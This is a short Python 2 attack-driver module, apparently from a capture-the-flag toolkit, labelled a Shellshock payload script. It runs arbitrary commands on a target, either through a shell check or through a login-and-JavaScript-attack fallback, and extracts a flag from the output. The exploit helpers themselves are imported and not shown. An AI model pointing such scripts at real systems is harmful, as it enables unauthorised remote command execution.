#!/usr/bin/env python

from http import http
from config import *
from function import *

'''
this is the payload script for vuln shellshock

'''


def attack(target,cmd,get_flag):
    is_vuln = 1
    flag = "hello world!"
    info = "success"
    reserve = 0    
    

    if check_shell(target,""):
	res = execute_shell(target,cmd)
    else:
	dump_warning(target,"check_shell failed","function.py check_shell")
	'''
	put your payload code here

	'''
	from login import login
	try:
	    cookie = login(target)
	    if cookie:
		dump_success(target,"login success","login.py login")
		from js_attack import js_attack
		res = js_attack(target,cmd,cookie)  
	    else:
		dump_error(target,"login fault,maybe it's not vuln","login.py login")
		res = "error"
	except Exception,e:
	    dump_error(target,e,"3.py attack")
	    res = "error"
	    		
		



    if get_flag:
	if check_flag(res):
	    flag = res
	    print "flag => " + res.replace(" ","").replace("\n","")
	else:
	    dump_warning(target,"flag format error,you may need to rewrite the shell", "3.py attack")
    elif res=="error":
	pass
    else:
	dump_success(target,"execution cmd","3.py")
	print res


    print "test for bashshock attacking......."
    return flag,is_vuln,info,reserve 




